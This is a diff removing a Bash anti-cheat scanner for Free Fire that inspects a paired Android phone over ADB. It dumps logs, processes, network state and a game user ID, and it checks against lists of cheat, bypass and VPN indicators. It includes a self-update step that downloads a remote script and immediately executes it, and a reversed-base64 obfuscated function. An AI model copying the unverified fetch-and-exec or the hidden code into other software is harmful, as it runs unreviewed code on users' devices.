-                if ! echo "$_conn_ip" | grep -q "$_garena_ranges"; then
-                    local _ya_logueado=0
-                    for _l in "${_logs[@]}"; do
-                        echo "$_l" | grep -q "$_conn_ip" && _ya_logueado=1 && break
-                    done
-                    if [ "$_ya_logueado" = "0" ]; then
-                        _sospechas=$(( _sospechas + 1 ))
-                        _logs+=("$(date '+%H:%M:%S') [⚠ PROXY/EXT] Conexión externa: $_conn")
-                    fi
-                else
-                    local _ya_ok=0
-                    for _l in "${_logs[@]}"; do
-                        echo "$_l" | grep -q "$_conn_ip" && _ya_ok=1 && break
-                    done
-                    [ "$_ya_ok" = "0" ] && _logs+=("$(date '+%H:%M:%S') [OK] Garena: $_conn")
-                fi
-            done <<< "$_mon_conns"
-        fi
-        _ultima_ip="$_mon_ip"
-        _ultima_wifi="$_mon_wifi"
-
-        # Dibujar pantalla — sección actual
-        clear
-        # Header
-        echo -e "${R}╔════════════════════════════════════════════════════════════════╗${N}"
-        echo -e "${R}║${W}         UNKNOWN SECURITY TEAM — MONITOR EN VIVO               ${R}║${N}"
-        echo -e "${R}║${C}                  $_nombre${R}$(printf '%*s' $((47 - ${#_nombre})) '')║${N}"
-        echo -e "${R}║${Y}               discord.gg/lavagancia                            ${R}║${N}"
-        echo -e "${R}╚════════════════════════════════════════════════════════════════╝${N}"
-        echo ""
-        echo -e "${Y}[T]${W} Monitor    ${Y}[L]${W} Logs    ${Y}[A]${W} Acerca de    ${R}[Q]${W} Salir${N}"
-        echo -e "${B}────────────────────────────────────────────────────────────────${N}"
-
-        # Contenido según sección activa
-        case "${_mon_section:-T}" in
-            T)
-                echo ""
-                echo -e "  ${C}Tiempo activo :${N} ${W}$_tiempo${N}"
-                echo -e "  ${C}IP del device :${N} ${W}${_mon_ip:-desconocida}${N}"
-                echo -e "  ${C}Red WiFi      :${N} ${W}$_mon_wifi${N}"
-                if [ -n "$_mon_pid" ]; then
-                    echo -e "  ${C}PID del juego :${N} ${G}$_mon_pid (activo)${N}"
-                else
-                    echo -e "  ${C}PID del juego :${N} ${R}no encontrado${N}"
-                fi
-                if [ "$_sospechas" -gt 0 ]; then
-                    echo -e "  ${C}Sospechas     :${N} ${R}$_sospechas ⚠${N}"
-                else
-                    echo -e "  ${C}Sospechas     :${N} ${G}0 — limpio${N}"
-                fi
-                echo ""
-                echo -e "${B}  Conexiones activas del proceso:${N}"
-                if [ -n "$_mon_conns" ]; then
-                    while IFS= read -r _c; do
-                        echo -e "    ${W}→ $_c${N}"
-                    done <<< "$_mon_conns"
-                else
-                    echo -e "    ${Y}Sin conexiones detectadas${N}"
-                fi
-                ;;
-            L)
-                echo ""
-                echo -e "${B}  Historial de conexiones:${N}"
-                echo ""
-                if [ "${#_logs[@]}" -eq 0 ]; then
-                    echo -e "    ${Y}Sin eventos registrados aún${N}"
-                else
-                    local _total=${#_logs[@]}
-                    local _start_idx=$(( _total > 15 ? _total - 15 : 0 ))
-                    for (( i=_start_idx; i<_total; i++ )); do
-                        local _log="${_logs[$i]}"
-                        if echo "$_log" | grep -q "SOSPECHOSO\|PROXY"; then
-                            echo -e "    ${R}$_log${N}"
-                        else
-                            echo -e "    ${G}$_log${N}"
-                        fi
-                    done
-                fi
-                ;;
-            A)
-                echo ""
-                echo -e "  ${C}UNKNOWN Security Team${N}"
-                echo -e "  ${W}Herramienta de análisis anti-cheat para Free Fire.${N}"
-                echo ""
-                echo -e "  ${W}Este monitor registra en tiempo real las conexiones${N}"
-                echo -e "  ${W}de red del juego mientras está activo, detectando${N}"
-                echo -e "  ${W}proxies, VPNs y cambios de IP sospechosos.${N}"
-                echo ""
-                echo -e "  ${C}Desarrollado por:${N} ${W}UNKNOWN Security Team${N}"
-                echo -e "  ${C}GitHub:${N}           ${W}github.com/Streakxit${N}"
-                echo -e "  ${C}Discord:${N}          ${W}discord.gg/lavagancia${N}"
-                echo ""
-                echo -e "  ${Y}Este software es de uso exclusivo del equipo.${N}"
-                echo -e "  ${Y}No redistribuir sin autorización.${N}"
-                ;;
-        esac
-
-        echo ""
-        echo -e "${B}────────────────────────────────────────────────────────────────${N}"
-        echo -ne "${Y}Navegá [T/L/A/Q] o Enter para actualizar: ${N}"
-        read -r -t 5 _mon_input
-        case "${_mon_input^^}" in
-            T) _mon_section="T" ;;
-            L) _mon_section="L" ;;
-            A) _mon_section="A" ;;
-            Q) main_menu; return ;;
-            *) : ;;
-        esac
-    done
-}
-
-
-actualizar_scanner() {
-    clear; banner
-    echo -e "${B}[*] Actualizando scanner...${N}\n"
-
-    local _raw="https://raw.githubusercontent.com/tizikernel/tiziSS/main/scanner.sh"
-    local _dest="$HOME/scanner.sh"
-
-    echo -e "${B}[*] Descargando última versión desde GitHub...${N}"
-    if curl -fsSL --max-time 30 --connect-timeout 10 "$_raw" -o "$_dest.tmp" 2>/dev/null; then
-        mv "$_dest.tmp" "$_dest"
-        chmod +x "$_dest"
-        echo -e "${G}[✓] Scanner actualizado correctamente${N}"
-        echo -e "${Y}[*] Reiniciando scanner...${N}"
-        sleep 1
-        exec bash "$_dest"
-    else
-        rm -f "$_dest.tmp"
-        echo -e "${R}[!] Error al descargar la actualización. Verificá tu conexión.${N}"
-        echo -e "${W}Presioná Enter para volver al menú...${N}"; read
-        main_menu
-    fi
-}
-
-guardar_dumpsys() {
-    clear; banner
-    echo_hdr "GUARDAR DIAGNÓSTICO COMPLETO" "$B"
-
-    if ! adb devices | grep -q "device$"; then
-        echo -e "${R}[!] No hay dispositivos conectados. Usá la opción [0]${N}"
-        echo -e "${W}Enter...${N}"; read; main_menu; return
-    fi
-
-    DUMP_DIR="/sdcard/Download/unknown_dump_$(date +%Y%m%d_%H%M%S)"
-    mkdir -p "$DUMP_DIR"
-    echo -e "${B}[*] Guardando en: ${W}$DUMP_DIR${N}\n"
-
-    _dump() {
-        echo -ne "${B}  → $1...${N}"
-        eval "$2" > "$DUMP_DIR/$3" 2>&1
-        echo -e " ${G}OK${N}"
-    }
-
-    _dump "Propiedades"         "adb shell 'getprop 2>/dev/null'"                          "getprop.txt"
-    _dump "Kernel info"         "adb shell 'uname -a; echo; cat /proc/version; echo; cat /proc/cmdline | tr \"\\0\" \" \"'" "kernel_info.txt"
-    for buf in main system events kernel crash; do
-        _dump "Logcat [$buf]"   "adb shell 'logcat -d -b $buf 2>/dev/null'"                "logcat_${buf}.txt"
-    done
-    _dump "Logcat completo"     "adb shell 'logcat -d -v threadtime -b all 2>/dev/null | tail -n 8000'" "logcat_all.txt"
-    for svc in package activity procstats batterystats appops usb media_projection overlay; do
-        _dump "dumpsys $svc"    "adb shell 'dumpsys $svc 2>/dev/null'"                     "dumpsys_${svc}.txt"
-    done
-    _dump "usagestats"          "adb shell 'dumpsys usagestats 2>/dev/null | tail -n 8000'" "dumpsys_usagestats.txt"
-    _dump "Procesos"            "adb shell 'ps -A -Z 2>/dev/null'"                         "ps_full.txt"
-    _dump "Montajes"            "adb shell 'cat /proc/mounts 2>/dev/null'"                 "mounts.txt"
-    _dump "TCP"                 "adb shell 'cat /proc/net/tcp /proc/net/tcp6 2>/dev/null'" "tcp.txt"
-    _dump "Unix sockets"        "adb shell 'cat /proc/net/unix 2>/dev/null'"               "unix_sockets.txt"
-    _dump "Dropbox"             "adb shell 'dumpsys dropbox 2>/dev/null'"                  "dumpsys_dropbox.txt"
-    _dump "Package FF Normal"   "adb shell 'dumpsys package com.dts.freefireth 2>/dev/null'"  "pkg_ff.txt"
-    _dump "Package FF MAX"      "adb shell 'dumpsys package com.dts.freefiremax 2>/dev/null'" "pkg_ffmax.txt"
-
-    echo ""
-    DUMP_SIZE=$(du -sh "$DUMP_DIR" 2>/dev/null | cut -f1)
-    echo -e "${G}[✓] Guardado: ${W}$DUMP_DIR ${G}($DUMP_SIZE)${N}"
-    echo -e "${Y}[*] Guardado en Descargas: $(basename $DUMP_DIR)${N}"
-    echo ""
-    echo -e "${W}Enter para volver...${N}"; read; main_menu
-}
-
-_ADB_PORT=""
-
-conectar_adb() {
-    clear; banner
-    echo_hdr "INSTRUCCIONES PARA CONECTAR ADB" "$B"
-    echo -e "${W}1. Ajustes > Opciones de Desarrollador${N}"
-    echo -e "${W}2. Activar 'Depuración inalámbrica'${N}"
-    echo -e "${W}3. Tocar 'Vincular dispositivo mediante código'${N}"
-    echo -e "${W}4. Anotar el código de 6 dígitos y el puerto${N}"
-    echo ""
-    echo -ne "${Y}Código de 6 dígitos: ${N}"; read -r pair_code
-    if [ ${#pair_code} -ne 6 ]; then
-        echo -e "${R}[!] Código debe tener 6 dígitos${N}"; sleep 2; conectar_adb; return
-    fi
-    echo -ne "${Y}Puerto de pareamiento: ${N}"; read -r pair_port_input
-    pair_port=$(echo "$pair_port_input" | grep -oE '[0-9]+$' | tail -1)
-    if [ -z "$pair_port" ] || [ "$pair_port" -lt 1 ] || [ "$pair_port" -gt 65535 ]; then
-        echo -e "${R}[!] Puerto inválido${N}"; sleep 2; conectar_adb; return
-    fi
-    echo -e "${B}[*] Pareando...${N}"
-    PAIR_RESULT=$(adb pair localhost:$pair_port $pair_code 2>&1)
-    if ! echo "$PAIR_RESULT" | grep -qi "successfully\|success"; then
-        echo -e "${R}[!] Error en pareamiento${N}"; echo -e "${W}Enter para volver...${N}"; read; main_menu; return
-    fi
-    echo -e "${G}[✓] Pareamiento exitoso${N}"
-    echo ""
-    echo -e "${Y}Cerrá la ventana del código y anotá el puerto que aparece arriba${N}"
-    echo -ne "${Y}Puerto de conexión: ${N}"; read -r connect_port_input
-    connect_port=$(echo "$connect_port_input" | grep -oE '[0-9]+$' | tail -1)
-    if [ -z "$connect_port" ] || [ "$connect_port" -lt 1 ] || [ "$connect_port" -gt 65535 ]; then
-        echo -e "${R}[!] Puerto inválido${N}"; sleep 2; conectar_adb; return
-    fi
-    echo -e "${B}[*] Conectando...${N}"
-    CONNECT_RESULT=$(adb connect localhost:$connect_port 2>&1)
-    if echo "$CONNECT_RESULT" | grep -qi "connected"; then
-        echo -e "${G}[✓] Conexión exitosa${N}"
-        _ADB_PORT="$connect_port"
-    else
-        echo -e "${R}[!] Error en conexión${N}"
-    fi
-    sleep 1
-    adb devices | grep -q "device$" && echo -e "${G}[✓] Dispositivo listo${N}" || echo -e "${R}[!] Dispositivo no conectado${N}"
-    echo -e "${W}Enter para volver...${N}"; read; main_menu
-}
-
-scan_ff_normal() { GAME_PKG="com.dts.freefireth";  GAME_SELECTED="Free Fire";    verificar_hwid_ban && ejecutar_scan; }
-scan_ff_max()    { GAME_PKG="com.dts.freefiremax"; GAME_SELECTED="Free Fire MAX"; verificar_hwid_ban && ejecutar_scan; }
-
-ver_ultimo_log() {
-    clear; banner
-    ULTIMO_LOG=$(ls -t $HOME/anticheat_log_*.txt 2>/dev/null | head -1)
-    if [ -z "$ULTIMO_LOG" ]; then
-        echo -e "${R}[!] No hay logs guardados${N}"; echo -e "${W}Enter...${N}"; read; main_menu; return
-    fi
-    cat "$ULTIMO_LOG"
-    echo -e "${W}Enter para volver...${N}"; read; main_menu
-}
-
-ejecutar_scan() {
-    clear; banner
-    IG_URL="https://www.instagram.com/tizi_7zz?igsh=MTdndzJyb2hzeDJmZQ=="
-    SEP="${Y}$(_hl $COLS ═)${N}"
-    DIV="${Y}$(_hl $COLS ─)${N}"
-    echo -e "$SEP"
-    echo -e "${Y}  [!] AVISO: El scanner puede cometer falsos positivos.${N}"
-    echo -e "${W}      Ante la duda, siempre revisá manualmente.${N}"
-    echo -e "$SEP"
-    echo ""
-    echo ""
-    echo -ne "${W}  [ENTER] iniciar scan / [I] abrir Instagram: ${N}"
-    read -r _opc
-    if [[ "${_opc,,}" == "i" ]]; then
-        if command -v termux-open-url &>/dev/null; then
-            termux-open-url "$IG_URL"
-        else
-            am start -a android.intent.action.VIEW -d "$IG_URL" &>/dev/null
-        fi
-        echo -ne "${W}  Presiona [ENTER] para continuar... ${N}"; read
-    fi
-
-    clear; banner
-    registrar_uso
-    log_output "${B}[*] Escaneando: $GAME_SELECTED${N}\n"
-
-    if ! adb devices | grep -q "device$"; then
-        log_output "${R}[!] No hay dispositivos conectados. Usá la opción [0]${N}"
-        echo -e "${W}Enter...${N}"; read; main_menu; return
-    fi
-
-    prefetch_device_data
-
-    if ! echo "$PKG_CACHE" | grep -q "$GAME_PKG"; then
-        log_output "${R}[!] $GAME_SELECTED no está instalado${N}"
-        sleep 3; main_menu; return
-    fi
-    check_device_info
-    check_root
-    check_uptime
-    detect_shell_bypass
-    check_system_logs
-    check_time_changes
-    check_clipboard
-    check_downloads
-    check_vpn_dns
-    check_deleted_files
-    check_susfs
-    check_replays
-    check_wallhack_bypass
-    check_obb
-    check_apk_integrity
-    check_hooks
-    check_root_bypass
-    check_fake_time
-    check_tooling
-    check_selinux
-    check_boot_state
-    check_kernel
-    check_pif
-    check_device_spoof
-    check_ca_certs
-    check_mantis_keymap
-    check_recording
-    check_scenes
-    check_suspicious_packages
-    check_network_ports
-    check_adb_connections
-    check_nmap_portscan
-    check_uninstalled_apps
-    check_media_projection
-    check_data_local_tmp
-    check_dropbox_crashes
-    check_fakegps
-    check_ueventd
-    check_auto_time
-    check_termux_on_device
-    check_xiaomi_paths
-    check_active_dns
-    check_active_protocols
-    check_logcat_delta
-    check_process_delta
-    REPLAY_DIR="/sdcard/Android/data/$GAME_PKG/files/MReplays"
-    show_summary
-
-    echo -e "\n${W}Presiona Enter para volver al menú...${N}"; read
-    main_menu
-}
-
-prefetch_device_data() {
-    echo -e "${B}[*] Recopilando datos del dispositivo...${N}"
-    local T="$HOME/.usk_cache_$$"
-    mkdir -p "$T"
-
-    adb shell "pm list packages 2>/dev/null"                              > "$T/pkg.txt" &
-    adb shell "ps -A 2>/dev/null"                                         > "$T/ps.txt"  &
-    adb shell "getprop 2>/dev/null"                                       > "$T/prop.txt" &
-    adb shell "logcat -d -b all 2>/dev/null | tail -n 4000"              > "$T/log.txt"  &
-    adb shell "cat /proc/net/tcp /proc/net/tcp6 2>/dev/null"             > "$T/tcp.txt"  &
-    adb shell "cat /proc/mounts 2>/dev/null"                             > "$T/mnt.txt"  &
-    wait
-
-    PKG_CACHE=$(cat "$T/pkg.txt" 2>/dev/null | tr -d '\r')
-    PS_CACHE=$(cat "$T/ps.txt"  2>/dev/null | tr -d '\r')
-    PS_SNAPSHOT_INICIO="$PS_CACHE"
-    PROP_CACHE=$(cat "$T/prop.txt" 2>/dev/null | tr -d '\r')
-    LOG_CACHE=$(cat "$T/log.txt"  2>/dev/null | tr -d '\r')
-    LOG_LAST_LINE=$(echo "$LOG_CACHE" | tail -1)
-    TCP_CACHE=$(cat "$T/tcp.txt"  2>/dev/null | tr -d '\r')
-    MNT_CACHE=$(cat "$T/mnt.txt"  2>/dev/null | tr -d '\r')
-    rm -rf "$T"
-    echo -e "${G}[✓] Datos recopilados${N}
-"
-}
-
-check_device_info() {
-    sec_hdr "INFORMACIÓN DEL DISPOSITIVO"
-    ANDROID_VER=$(adb shell getprop ro.build.version.release | tr -d '\r\n')
-    DEVICE_MODEL=$(adb shell getprop ro.product.model | tr -d '\r\n')
-    DEVICE_BRAND=$(adb shell getprop ro.product.brand | tr -d '\r\n')
-    log_output "${B}[*] Android: ${W}$ANDROID_VER${N}"
-    log_output "${B}[*] Modelo:  ${W}$DEVICE_MODEL${N}"
-    log_output "${B}[*] Marca:   ${W}$DEVICE_BRAND${N}"
-
-    GAME_VER=$(adb shell "dumpsys package $GAME_PKG 2>/dev/null | grep versionName | head -1" | tr -d '\r' | sed 's/.*versionName=//')
-    [ -n "$GAME_VER" ] && log_output "${B}[*] Versión del juego: ${W}$GAME_VER${N}"
-
-    GAME_PID=$(adb shell "pidof $GAME_PKG 2>/dev/null" | tr -d '\r\n')
-    if [ -n "$GAME_PID" ]; then
-        # Calcular tiempo de ejecución via /proc/PID/stat
-        _pid_start=$(adb shell "awk '{print \$22}' /proc/$GAME_PID/stat 2>/dev/null" | tr -d '\r')
-        _hz=$(adb shell "getconf CLK_TCK 2>/dev/null" | tr -d '\r')
-        _uptime_s=$(adb shell "cat /proc/uptime 2>/dev/null | awk '{print int(\$1)}'" | tr -d '\r')
-        if [ -n "$_pid_start" ] && [ -n "$_hz" ] && [ -n "$_uptime_s" ] && [ "$_hz" -gt 0 ] 2>/dev/null; then
-            _start_s=$(( _pid_start / _hz ))
-            _running=$(( _uptime_s - _start_s ))
-            _hh=$(( _running / 3600 ))
-            _mm=$(( (_running % 3600) / 60 ))
-            _ss=$(( _running % 60 ))
-            log_output "${B}[*] PID del juego: ${W}$GAME_PID ${G}(corriendo hace ${_hh}h${_mm}m${_ss}s)${N}"
-        else
-            log_output "${B}[*] PID del juego: ${W}$GAME_PID ${G}(proceso activo)${N}"
-        fi
-        # TracerPid del proceso del juego — detecta debugger/inyector adjunto en runtime
-        GAME_TRACERPID=$(adb shell "grep TracerPid /proc/$GAME_PID/status 2>/dev/null" | tr -d '\r' | awk '{print $2}')
-        if [ -n "$GAME_TRACERPID" ] && [ "$GAME_TRACERPID" != "0" ]; then
-            log_output "${R}[!] PROCESO DEL JUEGO CON TRACER ADJUNTO (PID $GAME_TRACERPID)${N}"
-            _ctx "TracerPid≠0 en el proceso de Free Fire indica un debugger o herramienta de inyección (GameGuardian, Frida, ptrace directo) adjunta en runtime"
-            ((SUSPICIOUS_COUNT+=5))
-        fi
-        # UUID FreeFire
-        _uuid=$(adb shell "grep -r 'uuid\|UUID\|user_id\|userId' /data/data/$GAME_PKG/shared_prefs/ 2>/dev/null | grep -oE '[0-9]{8,20}' | head -1" | tr -d '\r')
-        [ -n "$_uuid" ] && log_output "${B}[*] UUID FreeFire: ${W}$_uuid${N}"
-    else
-        log_output "${B}[*] PID del juego: ${Y}no encontrado (juego no corriendo)${N}"
-    fi
-    echo ""
-}
-
-_d '=0nCiICIvh2YlBCIgAiCi0nT7RCVP9kUg4WaTBSXTyp4b13R7RiIgQXdwRXdv91ZvxGImYCIdBCMgEXZtACVP9kUfRkTV9kRkAyWgACIgogCpZGIgACIKETPU90TS9FROV1TGByOpkiM9sCVOV1TD91UV9USDlEUTV1UogCIgACIgACIgogI950ekQUTD9VVTRCI6gEVBBFIuVGIlxmYpNXZjNWYgU3cgoDVP9kUg0VIb1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsTXgISKn0lOlNWYwNnObdCIk1CIyRHI8BiIE10QfV1UkICIvh2YlhCJiAibtAyWgYWagACIgoQKx0CIkFWZoBCfgciccd' 'CIk1CIyRHI8BiIsxWdu9idlR2L+IDI1NHIoNWaodHI7wGb152L2VGZv4jMgU3cgYXLgQmbh1WbvNmIgwGblh2cgIGZhhCJ9QUTD9VVTBCIgAiCKkmZgACIgoQM9Q1TPJ1XE5UVPZEI7kSKz0zKU5UVPN0XTV1TJNUSQNVVThCKgACIgACIgAiCl52bkByOi0nT7RiZkACI9l1ekICI0VHc0V3bfd2bsBiJmASXgIiZkICIu1CIbBybkByOmBictACZhVmcgUGbph2dgwHIiMFSUFEUfV1UkICIvh2YlBCIgACIgACIKISfOtHJ68ERBR1QFRVREBSVTByTJJVQOlkQg0VIb1nU7RiIgQXdwRXdv91ZvxGI' 'gACIgACIgogblhGdgsTXgISKn0lOlNWYwNnObdCIk1CIyRHI8BiIThEVBB1XVNFJiAyboNWZoQiIg4WLgsFImlGIgACIKkyJyx1JgQWLgIHdgwHIiATMtACZhVGagwHIsxWdu9idlR2L+IDIpwFInU3cyVGc1N3JgUWbh5WLg8WLgcCaz5SdzdCIl1WYu1CIv1CIgACIgACIgACIgoAXgcSdzV3cnASZtFmbtAybtAyJ1N3aCdCIl1WYu1CIv1CInU3cuYmZvdCIl1WYu1CIv1CInU3cf91JgUWbh5WLg8WLgACIgACIgACIgAiCcByJrNWYi1SdzdCIl1WYu1CIv1CInIzM1N3JgUWbh5WLg8WLgcCN2U' '3cnASZtFmbtAybtAyJ1N3JgUWbh5WLggCXgACIgACIgAiCcBCbsVnbvYXZk9iPyAicvRmblZ3LgAXb09CbhN2bs9SY0FGZvAiYkF2LhRXYk9CI1N3Lg4WaiN3Lg0WZ0NXez9CIk5WamJCIsxWZoNHIiRWYoQSPThEVBB1XVNFIgACIKISfOtHJu4iLzVGduFWayFmdgkHI1NHIvlmch5WaiBybk5WYjlmZpJXZWBSXrsVfCtHJiACd1BHd192Xn9GbgACIgogCw0DVP9kUfRkTV9kRgACIgogIVNFIT9USSFkTJJEIvACVP9kUgUERg40kDn0QDVEVFRkIgIHZo91YlNHIgACIKsHIpgCdv9mcft2Ylh2Y'
-
-check_uptime() {
-    UPTIME=$(adb shell uptime | tr -d '\r')
-    log_output "${B}[*] Uptime: ${W}$UPTIME${N}"
-    if echo "$UPTIME" | grep -qE "up [0-9]+ min" && ! echo "$UPTIME" | grep -qE "up [1-9][0-9]+ min"; then
-        log_output "${R}[!] Reinicio muy reciente (menos de 10 min) — sospechoso${N}"
-        _ctx "Reinicio inmediato antes del scan puede indicar limpieza de logcat y procesos antes de la revisión"
-
-        ((SUSPICIOUS_COUNT++))
-    else
-        echo ""
-    fi
-}
-
-detect_shell_bypass() {
-    sec_hdr "DETECCIÓN DE BYPASS DE FUNCIONES SHELL"
-    BYPASS_DETECTADO=0
-
-    log_output "${B}[+] Verificando funciones shell maliciosas...${N}"
-    for func in pkg git stat adb; do
-        RESULT=$(adb shell "type $func 2>/dev/null | grep -q function && echo FUNCTION_DETECTED" 2>/dev/null | tr -d '\r')
-        if echo "$RESULT" | grep -q "FUNCTION_DETECTED"; then
-            log_output "${R}[!] BYPASS: Función '$func' sobrescrita${N}"
-            _ctx "Función shell sobrescrita redirige comandos del scanner a versiones falsas — técnica de evasión activa de antitrampas"
-            ((SUSPICIOUS_COUNT+=2)); BYPASS_DETECTADO=1
-        fi
-    done
-
-    log_output "${B}[+] Verificando archivos de configuración del shell...${N}"
-    CONFIG_FILES=("~/.bashrc" "~/.bash_profile" "~/.zshrc" "/data/data/com.termux/files/usr/etc/bash.bashrc")
-    for cfg in "${CONFIG_FILES[@]}"; do
-        CFG_RESULT=$(adb shell "if [ -f $cfg ]; then grep -E '(function pkg|function git|function stat|function adb|wendell77x)' $cfg 2>/dev/null; fi" 2>/dev/null | tr -d '\r')
-        if [ -n "$(echo "$CFG_RESULT" | tr -d '[:space:]')" ]; then
-            log_output "${R}[!] BYPASS: Funciones maliciosas en $cfg${N}"
-            ((SUSPICIOUS_COUNT+=2)); BYPASS_DETECTADO=1
-        fi
-    done
-
-    log_output "${B}[+] Verificando integridad de comandos básicos...${N}"
-    ECHO_RESULT=$(adb shell "echo test123" | tr -d '\r')
-    if [ "$ECHO_RESULT" != "test123" ]; then
-        log_output "${R}[!] BYPASS: Comando echo manipulado${N}"
-        ((SUSPICIOUS_COUNT+=2)); BYPASS_DETECTADO=1
-    fi
-    CURRENT_YEAR=$(date +%Y)
-    DATE_RESULT=$(adb shell "date +%Y 2>/dev/null" | tr -d '\r')
-    if [ -z "$DATE_RESULT" ] || [ "$DATE_RESULT" != "$CURRENT_YEAR" ]; then
-        FAKE_TIME_DETECTED=1
-        log_output "${R}[!] BYPASS: Comando date manipulado${N}"
-        _ctx "date manipulado puede devolver año/hora incorrectos — el scanner puede ser engañado sobre el estado temporal del sistema"
-        ((SUSPICIOUS_COUNT+=2)); BYPASS_DETECTADO=1
-    fi
-
-    log_output "${B}[+] Buscando archivos de bypass en el dispositivo...${N}"
-    BYPASS_FILES=$(adb shell 'find /sdcard /data/local/tmp -name "*.sh" -exec grep -l "function pkg\|function git\|function adb\|wendell77x" {} \; 2>/dev/null | head -5' 2>/dev/null | tr -d '\r')
-    if [ -n "$(echo "$BYPASS_FILES" | tr -d '[:space:]')" ]; then
-        log_output "${R}[!] BYPASS: Archivos de bypass encontrados${N}"
-        echo "$BYPASS_FILES" | while read -r f; do [ -n "$f" ] && log_output "${Y}  $f${N}"; done
-        ((SUSPICIOUS_COUNT+=2)); BYPASS_DETECTADO=1
-    fi
-
-    if [ $BYPASS_DETECTADO -eq 1 ]; then
-        log_output "${R}[!] ¡BYPASS DE SHELL DETECTADO! ¡APLICA EL W.O!${N}\n"
-    else
-        log_output "${G}[✓] Sin bypass de shell${N}\n"
-    fi
-}
-
-check_system_logs() {
-    log_output "${B}[+] Verificando logs del sistema...${N}"
-    FIRST_LOG=$(echo "$LOG_CACHE" | grep -oE "[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}" | head -1)
-    log_output "${Y}[*] Primer registro de log: $FIRST_LOG${N}\n"
-}
-
-check_time_changes() {
-    log_output "${B}[+] Verificando cambios de hora...${N}"
-    TIME_CHANGES=$(echo "$LOG_CACHE" | grep "Time changed" | grep -v "HCALL" | tail -3)
-    if [ -n "$TIME_CHANGES" ]; then
-        log_output "${R}[!] CAMBIOS DE HORA DETECTADOS${N}"
-        _ctx "Cambios de hora en logcat indican uso de fake time — se usa para activar cheats que dependen de timing o congelar partidas"
-        echo "$TIME_CHANGES" | while read -r line; do log_output "${Y}  $line${N}"; done
-        echo ""
-        ((SUSPICIOUS_COUNT++))
-    else
-        log_output "${G}[✓] Sin cambios de hora${N}\n"
-    fi
-}
-
-check_clipboard() {
-    log_output "${B}[+] Verificando uso de clipboard por Free Fire...${N}"
-    CLIP=$(echo "$LOG_CACHE" | grep 'hcallSetClipboardTextRpc' | tail -5)
-    if [ -n "$CLIP" ]; then
-        log_output "${Y}[!] Free Fire copió texto al portapapeles (posible cheat que copia datos del juego)${N}"
-        echo "$CLIP" | while read -r line; do log_output "${W}  $line${N}"; done
-        echo ""
-        ((SUSPICIOUS_COUNT++))
-    else
-        log_output "${G}[✓] Sin uso sospechoso del portapapeles${N}\n"
-    fi
-}
-
-check_downloads() {
-    log_output "${B}[+] Escaneando Downloads por APKs sospechosos...${N}"
-    APKS=$(adb shell "find /sdcard/Download /sdcard/Downloads -name '*.apk' 2>/dev/null" | tr -d '\r')
-    FOUND=0
-    while read -r apk; do
-        [ -z "$apk" ] && continue
-        NAME=$(basename "$apk" | tr '[:upper:]' '[:lower:]')
-        if echo "$NAME" | grep -qiE "hack|cheat|mod|panel|lucky|gg|magisk"; then
-            log_output "${R}[!] APK SOSPECHOSO: $(basename "$apk")${N}"
-            FOUND=1
-        fi
-    done <<< "$APKS"
-    if [ $FOUND -eq 0 ]; then
-        log_output "${G}[✓] Sin APKs sospechosos${N}\n"
-    else
-        ((SUSPICIOUS_COUNT+=2)); echo ""
-    fi
-}
-
-check_vpn_dns() {
-    sec_hdr "DETECCIÓN DE VPN/DNS/PROXY"
-    log_output "${B}[+] Verificando VPN activas...${N}"
-    VPN_PACKAGES=(
-        "com.nordvpn.android"
-        "net.openvpn.openvpn"
-        "com.expressvpn.vpn"
-        "com.surfshark.vpnclient.android"
-        "com.cloudflare.onedotonedotonedotone"
-        "com.protonvpn.android"
-        "de.blinkt.openvpn"
-        "com.psiphon3"
-        "com.v2ray.ang"
-        "com.shadowsocks.vpn"
-        "com.github.shadowsocks"
-        "com.hiddify.app"
-    )
-    VPN_DETECTED=0
-    for pkg in "${VPN_PACKAGES[@]}"; do
-        if echo "$PKG_CACHE" | grep -q "package:$pkg"; then
-            log_output "${R}[!] VPN INSTALADA: $pkg${N}"
-            _ctx "VPN puede redirigir tráfico del juego a través de proxy para interceptar/modificar paquetes"
-            VPN_DETECTED=1; ((SUSPICIOUS_COUNT++))
-        fi
-    done
-
-    VPN_IF=$(adb shell "ip link show 2>/dev/null | grep -iE 'tun[0-9]|tap[0-9]|ppp[0-9]'" | tr -d '\r')
-    if [ -n "$VPN_IF" ]; then
-        log_output "${R}[!] INTERFAZ VPN ACTIVA: $VPN_IF${N}"
-        _ctx "Interfaz tun/tap activa confirma VPN en uso durante el juego — posible intercepción de tráfico activa"
-        VPN_DETECTED=1; ((SUSPICIOUS_COUNT+=2))
-    fi
-
-    [ $VPN_DETECTED -eq 0 ] && log_output "${G}[✓] Sin VPN detectada${N}"
-    echo ""
-
-    log_output "${B}[+] Verificando DNS privado...${N}"
-    PRIVATE_DNS_MODE=$(adb shell "settings get global private_dns_mode" 2>/dev/null | tr -d '\r')
-    PRIVATE_DNS_HOST=$(adb shell "settings get global private_dns_specifier" 2>/dev/null | tr -d '\r')
-
-    if [ "$PRIVATE_DNS_MODE" = "hostname" ] && [ -n "$PRIVATE_DNS_HOST" ] && [ "$PRIVATE_DNS_HOST" != "null" ]; then
-        if echo "$PRIVATE_DNS_HOST" | grep -qiE "proxy|cheat|hack|vpn\."; then
-            log_output "${R}[!] DNS PRIVADO SOSPECHOSO: $PRIVATE_DNS_HOST${N}"
-            ((SUSPICIOUS_COUNT++))
-        else
-            log_output "${Y}[*] DNS privado configurado: $PRIVATE_DNS_HOST (verificar manualmente)${N}"
-        fi
-    else
-        log_output "${G}[✓] DNS privado no configurado o default${N}"
-    fi
-    echo ""
-
-    log_output "${B}[+] Verificando proxy HTTP...${N}"
-    HTTP_PROXY=$(adb shell "settings get global http_proxy" 2>/dev/null | tr -d '\r')
-    if [ -n "$HTTP_PROXY" ] && [ "$HTTP_PROXY" != "null" ] && [ "$HTTP_PROXY" != ":0" ]; then
-        log_output "${R}[!] PROXY HTTP CONFIGURADO: $HTTP_PROXY${N}"
-        ((SUSPICIOUS_COUNT+=2))
-    else
-        log_output "${G}[✓] Sin proxy HTTP${N}"
-    fi
-    echo ""
-}
-
-check_deleted_files() {
-    sec_hdr "ARCHIVOS ELIMINADOS RECIENTEMENTE (GAME DATA)"
-    GAME_DATA_DIR="/sdcard/Android/data/$GAME_PKG"
-    GAME_OBB_DIR="/sdcard/Android/obb/$GAME_PKG"
